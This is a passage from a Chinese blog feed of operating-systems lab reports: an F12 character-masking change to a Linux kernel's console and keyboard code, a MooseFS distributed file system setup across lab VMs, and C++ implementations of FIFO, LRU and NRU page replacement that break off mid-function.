<p>加入如下代码，在写字符之前根据 <code>f12_state</code> 的状态判断是否要将字符修改为 <code>*</code>。根据要求，只将字母显示为 <code>*</code>。</p>
<figure class="highlight c"><figcaption><span>/kernel/chr_drv/console.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((c &gt;= <span class="string">'A'</span> &amp;&amp; c &lt;= <span class="string">'Z'</span> || c &gt;= <span class="string">'a'</span> &amp;&amp; c &lt;= <span class="string">'z'</span>) &amp;&amp; f12_state==<span class="number">1</span>) c = <span class="string">'*'</span>;</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="change-4"><p>在开头添加对<kbd> f12</kbd> 扫描码（<code>0x58</code>）的检测</p>
<figure class="highlight plaintext"><figcaption><span>/kernel/chr_drv/keyboard.S</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">....</span><br><span class="line">func:</span><br><span class="line"> cmpb $0x58,%al  # this</span><br><span class="line"> jne continue_func</span><br><span class="line"> pushl %eax</span><br><span class="line"> pushl %ecx</span><br><span class="line"> pushl %edx</span><br><span class="line"> call switch_f12</span><br><span class="line"> popl %edx</span><br><span class="line"> popl %ecx</span><br><span class="line"> popl %eax</span><br><span class="line"> jmp end_func</span><br><span class="line">....</span><br><span class="line">continue_func:</span><br><span class="line">....</span><br></pre></td></tr></tbody></table></figure></div></div></div>
<div class="note warning"><p>对内核文件作修改后，需要重新运行 <code>make</code> 和 <code>make start</code></p>
</div>
<h2 id="实验关键里程碑数据与结果">实验关键里程碑数据与结果</h2>
<h3 id="所安装的Qemu版本">所安装的 Qemu 版本</h3>
<p>由于 qemu 存在很多架构的模拟器，所以查看版本的命令并不是简单的 <code>qemu</code>，而是需要输入 qemu 架构的全名，后面加一个 <code>-version</code>（既不是 <code>--version</code> 也不是 <code>-v</code>）。</p>
<img data-src="/2019/12/04/experiments/oskernel/iodevice/qemu-version(x86-64).png" class="">
<p>而输入 <code>qemu-</code>，按<kbd> tab</kbd> 键提示的命令竟然有这么多</p>
<img data-src="/2019/12/04/experiments/oskernel/iodevice/qemu-environs.png" class="">
<p>本次实验用到的是其中的一种：<code>qemu-system-x86_64</code>，可以从 Makefile 文件中观察到。</p>
<img data-src="/2019/12/04/experiments/oskernel/iodevice/3.png" class="">
<p>修改相关文件后的运行结果。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/04/experiments/oskernel/iodevice/before-f12.png" class="" title="F12按下前"></div><div class="group-picture-column"><img data-src="/2019/12/04/experiments/oskernel/iodevice/after-f12.png" class="" title="F12按下后"></div></div></div>
<h2 id="实验难点与收获">实验难点与收获</h2>
<p>实验本身不难，但是根据需求完成内核代码修改时涉及到了不少文件，而且需要逐一确认修改完毕，而这仅仅只是输出设备相关的代码。在修改过程中，我体会到了内核代码的复杂性和系统性，对写操作系统内核的大佬们产生了由衷的敬意（确信）。</p>
<h2 id="实验思考">实验思考</h2>
<p>本次修改过程仅涉及到了一部分文件夹中的部分文件，整个内核中还有其他的文件和文件夹，它们是干什么的呢？</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>技术</category>
        <category>OS</category>
        <category>操作系统内核</category>
        <category>Linux 内核</category>
        <category>IO设备</category>
      </categories>
      <tags>
        <tag>OS</tag>
        <tag>Linux</tag>
        <tag>IO(输入输出设备)</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式文件系统 MooseFS 搭建</title>
    <url>/2019/12/21/experiments/oskernel/moosefs/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>配置分布式文件系统 MooseFS，并尝试挂载操作。</p>
<span id="more"></span>
<h2 id="步骤">步骤</h2>
<h3 id="源码编译">源码编译</h3>
<p>根据 MooseFS 官方 Github 上的指示，在 RHEL 上解压源码包，并创建用户，安装好必要的 build 包</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/21/experiments/oskernel/moosefs/1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/12/21/experiments/oskernel/moosefs/2.png" class=""></div></div></div>
<h3 id="配置master端">配置 master 端</h3>
<div class="note info"><p>IP：192.168.235.134，运行 Red Hat Linux 系统</p>
</div>
<p>创建相关文件夹和用户，运行 <code>make</code> 和 <code>make install</code>。</p>
<img data-src="/2019/12/21/experiments/oskernel/moosefs/3.png" class=""> <img data-src="/2019/12/21/experiments/oskernel/moosefs/4.png" class="">
<div class="note info"><p>注意 mfs 需要一个用户名为 <code>mfs</code> 的用户，它属于 <code>mfs</code> 用户组</p>
</div>
<img data-src="/2019/12/21/experiments/oskernel/moosefs/5.png" class="">
<p>进入 mfs 安装目录下的 <code>etc/mfs</code> 文件夹，将 mfsmaster、msfexports、msftopology 的 <code>cfg</code> 文件后的 <code>sample</code> 后缀去掉。然后将 <code>var/mfs</code> 文件夹下的 <code>metadata.mfs.empty</code> 更名为 <code>metadata.mfs</code>。删除原来的 empty 文件。 <img data-src="/2019/12/21/experiments/oskernel/moosefs/6.png" class=""> 做完上述配置，就可以启动 mfs 安装目录下的 <code>sbin/mfsmaster</code> 了（<code>mfsmaster start</code>）。其在 9421 端口下监听客户端连接，9420 端口下监听 chunkserver 连接。 <img data-src="/2019/12/21/experiments/oskernel/moosefs/7.png" class=""> 可以开启 sbin 下的 <code>mfscgiserv</code>，以 web 端方式来查看服务器情况，默认监听端口为 9425。需要在 <code>/etc/hosts</code> 中的绑定 <code>mfsmaster</code> 的解析 ip。</p>
<img data-src="/2019/12/21/experiments/oskernel/moosefs/8.png" class=""> <img data-src="/2019/12/21/experiments/oskernel/moosefs/9.png" class=""> <img data-src="/2019/12/21/experiments/oskernel/moosefs/10.png" class="">
<h3 id="配置chunkserver">配置 chunkserver</h3>
<div class="tabs" id="chunkservers"><ul class="nav-tabs"><li class="tab active"><a href="#chunkservers-1">A 端</a></li><li class="tab"><a href="#chunkservers-2">B 端</a></li><li class="tab"><a href="#chunkservers-3">client</a></li></ul><div class="tab-content"><div class="tab-pane active" id="chunkservers-1"><div class="note info"><p>IP：192.168.235.146，运行 Ubuntu 系统</p>
</div>
<ol>
<li>添加用户，创建目录，安装必需软件包。 <img data-src="/2019/12/21/experiments/oskernel/moosefs/17.png" class=""> <img data-src="/2019/12/21/experiments/oskernel/moosefs/18.png" class=""></li>
<li>配置 <code>configure</code>，然后运行 <code>make &amp;&amp; make install</code>。 <img data-src="/2019/12/21/experiments/oskernel/moosefs/22.png" class=""> <img data-src="/2019/12/21/experiments/oskernel/moosefs/23.png" class=""></li>
<li>Chunkserver 需要 <code>mfschunkserver</code> 和 <code>mfshdd</code> 两个配置文件。将它们更名。 <img data-src="/2019/12/21/experiments/oskernel/moosefs/24.png" class=""></li>
<li>创建两个挂载用的共享目录（实际上最后只用了第一个） 网上的教程上说最好给每一个目录配备单独的硬盘分区或 lvm 逻辑卷，但是本次实验不需要。 <img data-src="/2019/12/21/experiments/oskernel/moosefs/25.png" class=""></li>
<li>在 <code>mfshdd.cfg</code> 上添加共享目录。 <img data-src="/2019/12/21/experiments/oskernel/moosefs/26.png" class=""></li>
<li>运行 mfs 安装目录 <code>/sbin/mfschunkserver start</code> 启动 chunk server。它在 9422 端口监听。 <img data-src="/2019/12/21/experiments/oskernel/moosefs/27.png" class=""></li>
</ol></div><div class="tab-pane" id="chunkservers-2"><div class="note info"><p>IP：192.168.235.149，运行 Red Hat Linux 系统</p>
</div>
<ol>
<li>下列操作与 A 端类似 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/21/experiments/oskernel/moosefs/11.png" class=""></div><div class="group-picture-column"><img data-src="/2019/12/21/experiments/oskernel/moosefs/12.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/21/experiments/oskernel/moosefs/14.png" class=""></div><div class="group-picture-column"><img data-src="/2019/12/21/experiments/oskernel/moosefs/15.png" class=""></div></div></div></li>
<li>对了，要在 chunkserver 的 <code>/etc/hosts</code> 中绑定 mfsmaster 的地址。A 端的 ubuntu 系统也要这么做 <img data-src="/2019/12/21/experiments/oskernel/moosefs/13.png" class=""></li>
<li><code>mfschunkserver start</code> 启动数据服务器。它在 9422 端口监听。 <img data-src="/2019/12/21/experiments/oskernel/moosefs/16.png" class=""></li>
</ol></div><div class="tab-pane" id="chunkservers-3"><div class="note info"><p>IP：192.168.235.148，运行 Ubuntu 系统</p>
</div>
<img data-src="/2019/12/21/experiments/oskernel/moosefs/19.png" class=""> <img data-src="/2019/12/21/experiments/oskernel/moosefs/20.png" class=""></div></div></div>
<h2 id="实验关键里程碑数据与结果">实验关键里程碑数据与结果</h2>
<p>使用 mfs 安装目录 <code>/bin/mfsmount 目录名 -H &lt;mfsmaster IP地址&gt;</code> 来挂载目录，在此之前，先依次启用 mfsmaster 和两个 mfschunkserver。显示 accepted，即代表挂载成功</p>
<img data-src="/2019/12/21/experiments/oskernel/moosefs/32-Client.png" class="">
<p>此时查看被挂载的目录，会发现它空间很大，应该是所有 CHUNKSERVER 存储空间的和。</p>
<img data-src="/2019/12/21/experiments/oskernel/moosefs/33-df.png" class="">
<p>查看 mfsmaster 日志可以看到 chunkserver 注册连接的记录。 <img data-src="/2019/12/21/experiments/oskernel/moosefs/31-Server.png" class=""> Chunkserver 端也有相应的记录。（可以看到，此端成功连接到了主服务器）</p>
<img data-src="/2019/12/21/experiments/oskernel/moosefs/30-Bconnected.png" class="">
<p>实验结束后，先断开所有文件夹的挂载，然后停止 chunkserver，最后停止 masterserver。</p>
<div class="tabs" id="stopserver"><ul class="nav-tabs"><li class="tab active"><a href="#stopserver-1">chunkserverA</a></li><li class="tab"><a href="#stopserver-2">chunkserverB</a></li><li class="tab"><a href="#stopserver-3">masterserver</a></li></ul><div class="tab-content"><div class="tab-pane active" id="stopserver-1"><img data-src="/2019/12/21/experiments/oskernel/moosefs/34-stopchunk1.png" class=""></div><div class="tab-pane" id="stopserver-2"><img data-src="/2019/12/21/experiments/oskernel/moosefs/34-stopchunk2.png" class=""></div><div class="tab-pane" id="stopserver-3"><img data-src="/2019/12/21/experiments/oskernel/moosefs/34-stopmaster.png" class=""></div></div></div>
<p>访问 master 端的 cgi 网页，可以发现很多有用的信息，如下图所示</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/21/experiments/oskernel/moosefs/disks.png" class="" title="所有分布式存储的挂载目录信息"></div><div class="group-picture-column"><img data-src="/2019/12/21/experiments/oskernel/moosefs/servers.png" class="" title="所有服务器的在线情况信息"></div><div class="group-picture-column"><img data-src="/2019/12/21/experiments/oskernel/moosefs/info.png" class="" title="所有总的Info"></div></div></div>
<h2 id="实验难点与收获">实验难点与收获</h2>
<p>本次实验的步骤和参考资料来自：<br>
<a href="https://www.cnblogs.com/rockbes/p/3989395.html">https://www.cnblogs.com/rockbes/p/3989395.html</a><br>
<a href="https://www.cnblogs.com/rockbes/p/3989410.html">https://www.cnblogs.com/rockbes/p/3989410.html</a><br>
<a href="https://www.cnblogs.com/rockbes/p/3989419.html">https://www.cnblogs.com/rockbes/p/3989419.html</a><br>
<a href="https://github.com/moosefs/moosefs">https://github.com/moosefs/moosefs</a></p>
<p>这是一个相当复杂的配置实验！里面有很多坑点和难点，不过最后还是一步一步做了下来，很有成就感。</p>
<p>收获就是…… 很多步骤需要一定权限，这时候使用 root 权限是非常方便的，还有就是，涉及到虚拟机间的网络连接，一定要关防火墙！<code>systemctl stop firewalld.service</code></p>
<p>由于只是练习配置，各个角色之间联通即可，所以很多功能都还没有用上。实际上，MooseFS 的配置文件很有东西，潜力丰富。特别是本次实验没怎么用到的日志功能，在恢复受损文件系统上有着非常重要的作用。</p>
<h2 id="实验思考">实验思考</h2>
<h3 id="坑点集中">坑点集中</h3>
<ol>
<li>
<p>server start 时出现 can’t create lockfile in working directory: EACCES (Permission denied)，是因为编译时没指定 <code>--with-default-user=mfs</code>，所以生成的配置文件里运行用户是 <code>nobody</code>，运行组是 <code>mfs</code>，将用户修改即可成功。</p>
<p>我采用的是更省事的方法：编译时指定 <code>default-user=mfs</code></p>
</li>
<li>
<p>连不上 mfsmaster</p>
 <img data-src="/2019/12/21/experiments/oskernel/moosefs/28.png" class=""> 
<p>检查 mfsexports 文件中有没有为 client IP 放开权限。（取消 #注释） 前面那个 * 打头的也最好放开。</p>
 <img data-src="/2019/12/21/experiments/oskernel/moosefs/29.png" class="">
<p>如果还不行，关闭防火墙。</p>
</li>
</ol>
<h3 id="了解MooseFS">了解 MooseFS</h3>
<p>MooseFS 是一种分布式文件系统，MooseFS 文件系统结构包含四种角色。</p>
<div class="tabs" id="role"><ul class="nav-tabs"><li class="tab active"><a href="#role-1">管理服务器 master</a></li><li class="tab"><a href="#role-2">元数据日志服务器 metalogger</a></li><li class="tab"><a href="#role-3">数据存储服务器 chunkserver</a></li><li class="tab"><a href="#role-4">客户机挂载使用 client</a></li></ul><div class="tab-content"><div class="tab-pane active" id="role-1"><p>负责各个数据存储服务器的管理，文件读写调度，文件空间回收以及恢复、多节点拷贝</p></div><div class="tab-pane" id="role-2"><p>负责备份 master 服务器的变化日志文件，文件类型为 changelog_ml.*.mfs，以便于在 master server 出问题的时候接替其进行工作</p></div><div class="tab-pane" id="role-3"><p>听从管理服务器调度，提供存储空间，并为客户提供数据传输。真正存储用户数据的服务器。存储文件时，首先把文件分成块，然后这些块在数据服务器 chunkserver 之间复制（复制份数可以手工指定，建议设置副本数为<br>
3）。数据服务器可以是多个，并且数量越多，可使用的 “磁盘空间” 越大，可靠性也越高。</p></div><div class="tab-pane" id="role-4"><p>客户端挂载远程 mfs 服务器共享出的存储并使用。 通过 fuse 内核接口挂载进程管理服务器上所管理的数据存储服务器共享出的硬盘。共享的文件系统的用法和 nfs 相似。使用 MFS 文件系统来存储和访问的主机称为 MFS 的客户端，成功挂接<br>
MFS 文件系统以后，就可以像以前使用 NFS 一样共享这个虚拟性的存储了。</p></div></div></div>
<p>本次实验用到了角色 1、3 和 4。</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>技术</category>
        <category>OS</category>
        <category>操作系统内核</category>
        <category>分布式文件系统</category>
      </categories>
      <tags>
        <tag>OS</tag>
        <tag>文件系统</tag>
        <tag>MooseFS</tag>
      </tags>
  </entry>
  <entry>
    <title>页面调度算法实现</title>
    <url>/2019/10/27/experiments/oskernel/page-management/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>理解操作系统中的几种页面调度算法，尝试用 C++ 语言实现它们。</p>
<span id="more"></span>
<h2 id="步骤">步骤</h2>
<h3 id="重要的数据结构">重要的数据结构</h3>
<div class="tabs" id="data_structure"><ul class="nav-tabs"><li class="tab active"><a href="#data_structure-1"><code>Page.h</code></a></li><li class="tab"><a href="#data_structure-2"><code>PageControl.h</code></a></li></ul><div class="tab-content"><div class="tab-pane active" id="data_structure-1"><figure class="highlight c++"><figcaption><span>Page.h</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _PAGE_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PAGE_H</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CPage</span>  {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_nPageNumber, <span class="comment">//硬盘页编号(≤AP)</span></span><br><span class="line">		m_nPageFaceNumber, <span class="comment">//内存页编号(≤PP)，INVALID表示不在内存</span></span><br><span class="line">		m_nCounter, <span class="comment">//页面被使用次数</span></span><br><span class="line">		m_nTime; <span class="comment">//页面已存在内存中的时间</span></span><br><span class="line">};</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="data_structure-2"><figure class="highlight c++"><figcaption><span>PageControl.h</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _PAGECONTROL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PAGECONTROL_H</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CPageControl</span>  {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_nPageNumber,m_nPageFaceNumber;  <span class="comment">//硬盘页编号，内存页编号</span></span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">CPageControl</span> * m_pNext; <span class="comment">//指向下一个被控制页面</span></span><br><span class="line">};</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure></div></div></div>
<h3 id="算法示意">算法示意</h3>
<div class="tabs" id="algs"><ul class="nav-tabs"><li class="tab active"><a href="#algs-1">先进先出算法 FIFO</a></li><li class="tab"><a href="#algs-2">最近最少使用的算法 LRU</a></li><li class="tab"><a href="#algs-3">最近未使用算法 NRU</a></li><li class="tab"><a href="#algs-4">最佳置换算法 OPT</a></li></ul><div class="tab-content"><div class="tab-pane active" id="algs-1"><ol>
<li> 初始化。设置两个数组 <code>page[ap]</code> 和 <code>pagecontrol[pp]</code> 分别表示进程页面数和内存分配的页面数，并产生一个的随机数序列 <code>main[total_instruction]</code>（当然这个序列由 <code>page[]</code> 的下标随机构成），表示待处理的进程页面顺序，<code>diseffect</code> 置 0。</li>
<li>看 <code>main[]</code> 中是否有下一个元素，有就由 <code>main[]</code> 中获取该页面下标，并转到 3；没有，就转到 7。</li>
<li>如果该 <code>page</code> 页已在内存中，就转到 2；否则就到 4，同时未命中的 <code>diseffect</code> 加 1。</li>
<li>观察 <code>pagecontrol</code> 是否占满，如果占满需将使用队列（6 中建立的）中最先进入的（就是队列第一个单元）<code>pagecontrol</code> 单元 “清干净”，同时将对应的 <code>page[]</code> 单元置为 “不在内存中”。</li>
<li>将该 <code>page[]</code> 与 <code>pagecontrol[]</code> 建立关系（可以改变 <code>pagecontrol[]</code> 的标示位，也可以采用指针连接。总之，至少要使对应的 <code>pagecontrol</code> 单元包含两个信息：一是它被使用了，二是哪个 <code>page[]</code> 单元使用的；<code>page[]</code> 单元包含两个信息：对应的 <code>pagecontrol</code> 单元号、本 <code>page[]</code> 单元已在内存中）；</li>
<li>将用到的 <code>pagecontrol</code> 置入使用队列（这里的队列当然是一种先进先出的数据结构），返回 2；</li>
<li>显示命中率，算法完成。</li>
</ol>
<pre class="mermaid">graph TD
A(["初始化"]) --&gt; B{"main[] 中是否有下一个元素"} B --&gt; |Y|C["由main获取下一个元素页面下标"]
B --&gt; |N|D(["显示命中率，算法完成"])
C --&gt; E{"该页是否在内存中"} E --&gt; |Y|B E --&gt; |N|F["diseffect++"]
F --&gt; G{Pagecontrol是否占满} G --&gt; |Y|H["将最先进入的单元清干净，并重置状态"]
G --&gt; |N|I["建立page和pagecontrol的关系"]
H --&gt; I I --&gt; J["用到的Pagecontrol置入使用队列"]
J --&gt; B
</pre>
<figure class="highlight c++"><figcaption><span>FIFO 算法 </span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::FIFO</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span>{</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	CPageControl *p;</span><br><span class="line">	<span class="built_in">initialize</span>(nTotal_pf);</span><br><span class="line">	_pBusypf_head=_pBusypf_tail=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++) {</span><br><span class="line">	<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID){</span><br><span class="line">		_nDiseffect+=<span class="number">1</span>;</span><br><span class="line">    	<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>){  <span class="comment">// 无空闲页面</span></span><br><span class="line">	  		p=_pBusypf_head-&gt;m_pNext;</span><br><span class="line">	  		_vDiscPages[_pBusypf_head-&gt;m_nPageNumber].m_nPageFaceNumber=INVALID;</span><br><span class="line">	  		_pFreepf_head=_pBusypf_head;</span><br><span class="line">	  		_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">	  		_pBusypf_head=p;</span><br><span class="line">		}</span><br><span class="line">		p=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">		_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">		_pFreepf_head-&gt;m_nPageNumber=_vPage[i];</span><br><span class="line">		_vDiscPages[_vPage[i]].m_nPageFaceNumber =_pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">		<span class="keyword">if</span>(_pBusypf_tail==<span class="literal">NULL</span>)</span><br><span class="line">			_pBusypf_head=_pBusypf_tail=_pFreepf_head;</span><br><span class="line">		<span class="keyword">else</span>{</span><br><span class="line">	  		_pBusypf_tail-&gt;m_pNext=_pFreepf_head;</span><br><span class="line">	  		_pBusypf_tail=_pFreepf_head;</span><br><span class="line">		}</span><br><span class="line"> 		_pFreepf_head=p;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line"> 	cout&lt;&lt;<span class="string">"FIFO: "</span>&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<div class="note success"><p>易于实现</p>
</div>
<div class="note danger"><p>容易淘汰常用页面</p>
</div></div><div class="tab-pane" id="algs-2"><ol>
<li>初始化。主要是进程页面 <code>page[]</code> 和分配的内存页面 <code>pagecontrol[]</code>，同时产生随机序列 <code>main[]</code>，<code>diseffect</code> 置 0。</li>
<li>看序列 <code>main[]</code> 是否有下一个元素，有就由 <code>main[]</code> 中获取该页面下标，并转到 3；没有，就转到 6。</li>
<li>如果该 <code>page</code> 页已在内存中，便改变页面属性，使它保留 “最近使用” 的信息，转到 2；否则就到 4，同时未命中的 <code>diseffect</code> 加 1。</li>
<li>判断是否有空闲的内存页面，如果有，就返回页指针，转到 5；否则在内存页面中找出最长时间没有使用到的页面，将其 “清干净”，并返回该页面指针。</li>
<li>在需要处理的 <code>page[]</code> 与 4 中得到的 <code>pagecontrol[]</code> 建立关系，同时让对应的 <code>page[]</code> 单元保存 “最新使用” 的信息，返回 2；</li>
<li>如果序列处理完成，就输出命中率，算法结束。</li>
</ol>
<pre class="mermaid">graph TD
 A(["初始化"]) --&gt; B{"main[] 中是否有下一个元素"} B --&gt; |Y|C["由main获取下一个元素页面下标"]
B --&gt; |N|D(["显示命中率，算法完成"])
C --&gt; E{"该页是否在内存中"} E --&gt; |Y|E_1["修改页面属性，使它保留“最近使用”的信息"]
E_1 --&gt; B E --&gt; |N|F["diseffect++"]
F --&gt; G{是否有空闲页面} G --&gt; |Y|H["返回该页面指针"]
G --&gt; |N|I["在内存页面中找出最长时间没有使用到的页面,将其清理"]
I --&gt; H H --&gt; J[内存页面和待处理的进程页面建立关系,对应单元保存最新使用信息]
J --&gt; B 
</pre>
<figure class="highlight c++"><figcaption><span>LRU 算法 </span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::LRU</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span>{</span><br><span class="line">	<span class="type">int</span> i,j,nMin,minj,<span class="built_in">nPresentTime</span>(<span class="number">0</span>);</span><br><span class="line"> 	<span class="built_in">initialize</span>(nTotal_pf);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++){</span><br><span class="line">  		<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID){</span><br><span class="line">  			_nDiseffect++;</span><br><span class="line">  			<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>){</span><br><span class="line">      			nMin=<span class="number">32767</span>;</span><br><span class="line">      			<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">                <span class="comment">// 得到最近最少使用的页面的页号</span></span><br><span class="line">                <span class="comment">// 循环结束后,iMin表示最近最少使用页面的访问次数;minj表示需要换出的页号</span></span><br><span class="line">					<span class="keyword">if</span>(nMin&gt;_vDiscPages[j].m_nTime&amp;&amp;_vDiscPages[j].m_nPageFaceNumber!=INVALID){</span><br><span class="line">						nMin=_vDiscPages[j].m_nTime;</span><br><span class="line">	    				minj=j;</span><br><span class="line">					}</span><br><span class="line"></span><br><span class="line">				_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[minj].m_nPageFaceNumber];</span><br><span class="line">				_vDiscPages[minj].m_nPageFaceNumber=INVALID;</span><br><span class="line">				_vDiscPages[minj].m_nTime=<span class="number">-1</span>;</span><br><span class="line">				_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">   			}</span><br><span class="line">			_vDiscPages[_vPage[i]].m_nPageFaceNumber=_pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">			_vDiscPages[_vPage[i]].m_nTime=nPresentTime;</span><br><span class="line">			_pFreepf_head=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			_vDiscPages[_vPage[i]].m_nTime=nPresentTime;</span><br><span class="line">		nPresentTime++;</span><br><span class="line">	}</span><br><span class="line">  	cout&lt;&lt;<span class="string">"LRU: "</span>&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<div class="note success"><p>页面利用率有显著提升</p>
</div>
<div class="note danger"><p>代价很大</p>
</div></div><div class="tab-pane" id="algs-3"><ol>
<li>初始化。设置两个数组 <code>page[ap]</code> 和 <code>pagecontrol[pp]</code> 分别表示进程页面数和内存分配的页面数，并产生一个的随机数序列 <code>main[total_instruction]</code>（当然这个序列由 <code>page[]</code> 的下标随机构成），表示待处理的进程页面顺序，<code>diseffect</code> 置 0，设定循环周期 <code>CLEAR_PERIOD</code>。</li>
<li>看 <code>main[]</code> 中是否有下一个元素，有就从 <code>main[]</code> 中获得一个 CPU 将处理页面的序号；没有，就转到 8。</li>
<li>如果待处理的页面已在内存中，就转到 2；否则 <code>diseffect</code> 加 1，并转到 4。</li>
<li>看是否有空闲的内存页面，如果有，返回空闲页面指针，转到 5；否则，在所有没有被访问且位于内存中的页面中按任意规则（或者取最近的一个页面；或者取下标最小的页面，等等）取出一个，返回清空后的内存页面指针。</li>
<li>在待处理进程页面与内存页面之间建立联系，并标注该页面被访问。</li>
<li>如果 CPU 已处理了 <code>CLEAR_PERIOD</code> 个页面，就将所有页面均设为 “未访问”。</li>
<li>返回 2。</li>
<li>如果 CPU 所有处理工作完成，就返回命中率的结果，算法结束。</li>
</ol>
<pre class="mermaid">graph TD
 A(["初始化"]) --&gt; B{"main[] 中是否有下一个元素"} B --&gt; |Y|C["由main获取下一个元素页面下标"]
B --&gt; |N|D(["显示命中率，算法完成"])
C --&gt; E{"该页是否在内存中"} E --&gt; B E --&gt; |N|F["diseffect++"]
F --&gt; G{是否有空闲页面} G --&gt; |Y|H["返回该页面指针"]
G --&gt; |N|I["在所有没有被访问且位于内存中的页面中按任意规则（或者取最近的一个页面；或者取下标最小的页面，等等）取出一个"]
I --&gt; H H --&gt; J[内存页面和待处理的进程页面建立关系,标注页面被访问]
J --&gt; K{"CPU已经处理了CLEAR_PERIOD个页面"} K --&gt; |N|B K --&gt; |Y|B'["将所有页面设置为'未访问'"]
B'--&gt; B 
</pre>
<figure class="highlight c++"><figcaption><span>NRU 算法 </span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::NRU</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span>   </span>{</span><br><span class="line">	<span class="type">int</span> i,j,nDiscPage,nOld_DiscPage;</span><br><span class="line"> 	<span class="type">bool</span> bCont_flag;</span><br><span class="line">  	<span class="built_in">initialize</span>(nTotal_pf);</span><br><span class="line">  	nDiscPage=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)     {</span><br><span class="line">		<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID)  	{</span><br><span class="line">  			_nDiseffect++;</span><br><span class="line">  			<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)	    {</span><br><span class="line">      			bCont_flag=<span class="literal">true</span>;</span><br><span class="line">      			nOld_DiscPage=nDiscPage;</span><br><span class="line">      			<span class="keyword">while</span>(bCont_flag)		{</span><br><span class="line">					<span class="keyword">if</span>(_vDiscPages[nDiscPage].m_nCounter==<span class="number">0</span>&amp;&amp;_vDiscPages[nDiscPage].m_nPageFaceNumber!=INVALID)</span><br><span class="line">	    					bCont_flag=<span class="literal">false</span>;</span><br><span class="line">					<span class="keyword">else</span> {</span><br><span class="line">  						nDiscPage++;</span><br><span class="line">  						<span class="keyword">if</span>(nDiscPage==TOTAL_VP) nDiscPage=<span class="number">0</span>;</span><br><span class="line">  						<span class="keyword">if</span>(nDiscPage==nOld_DiscPage)</span><br><span class="line">  						<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">	  						_vDiscPages[j].m_nCounter=<span class="number">0</span>;</span><br><span class="line">	   				}</span><br><span class="line">				}</span><br><span class="line">				_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[nDiscPage].m_nPageFaceNumber];</span><br><span class="line">				_vDiscPages[nDiscPage].m_nPageFaceNumber=INVALID;</span><br><span class="line">      			